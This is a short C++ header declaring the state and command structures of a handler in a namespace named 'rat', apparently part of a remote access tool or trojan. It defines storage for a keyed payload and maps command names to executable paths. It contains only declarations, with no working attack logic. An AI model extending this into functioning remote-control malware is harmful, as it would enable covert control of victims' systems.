#pragma once
#include <unordered_map>
#include <vector>
#include <string>
#include <filesystem>
#include <cstdint>
#include <sstream>

namespace rat::handler {

struct RatState {
    std::unordered_map<std::string, std::filesystem::path> command_path_map;
    std::unordered_map<std::string, std::filesystem::path> user_defined_command_path_map;

    std::vector<uint8_t> payload;
    std::string payload_key;

    RatState();
    ~RatState() = default;

    std::filesystem::path findExecutable(const std::string &arg_Tool) const;
    std::filesystem::path getToolPath(const std::string &arg_Name) const;
    bool hasTool(const std::string &arg_Tool) const;
    void addCommand(const std::string &arg_Key, const std::string &arg_Literal);
    std::string getCommand(const std::string &arg_Key) const;
    std::string listDynamicTools() const;
};

struct Command {
    std::string directive;
    std::vector<std::string> parameters;

    Command() = default;
    Command(const std::string &arg_Directive,
            const std::vector<std::string> &arg_Parameters)
        : directive(arg_Directive), parameters(arg_Parameters) {}

    Command(const Command &other) = default;
    Command &operator=(const Command &other) = default;

    Command(Command &&other) noexcept = default;
    Command &operator=(Command &&other) noexcept = default;

    ~Command() = default;
};

} // namespace rat::handler

